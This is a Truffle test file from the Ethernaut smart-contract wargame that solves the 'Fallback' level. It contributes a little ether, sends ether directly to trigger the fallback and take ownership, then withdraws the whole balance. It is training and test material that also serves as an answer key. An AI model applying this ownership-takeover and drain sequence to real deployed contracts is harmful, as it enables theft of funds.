const FallbackFactory = artifacts.require('./levels/FallbackFactory.sol')
const Fallback = artifacts.require('./attacks/Fallback.sol')

const Ethernaut = artifacts.require('./Ethernaut.sol')

import expectThrow from 'zeppelin-solidity/test/helpers/expectThrow'
import toPromise from 'zeppelin-solidity/test/helpers/toPromise'
import * as utils from '../utils/TestUtils'

contract('Fallback', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await FallbackFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should allow the player to solve the level', async function() {

    const instance = await utils.createLevelInstance(
      ethernaut, level.address, player, Fallback,
      {from: player}
    )

    assert.equal(await instance.owner(), level.address)
    assert.equal(web3.toWei(1000, 'ether'), (await instance.getContribution({from: level.address})).toNumber())

    await instance.contribute({from: player, value: web3.toWei(0.0001, 'ether')})
    assert.notEqual(0, (await instance.getContribution({from: player})).toNumber())
    assert.notEqual(0, await utils.getBalance(web3, instance.address))

    await toPromise(web3.eth.sendTransaction)({from: player, to: instance.address, value: web3.toWei(0.001, 'ether')})
    assert.equal(player, await instance.owner())

    await instance.withdraw({from: player})
    assert.equal(0, await utils.getBalance(web3, instance.address))

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });
});
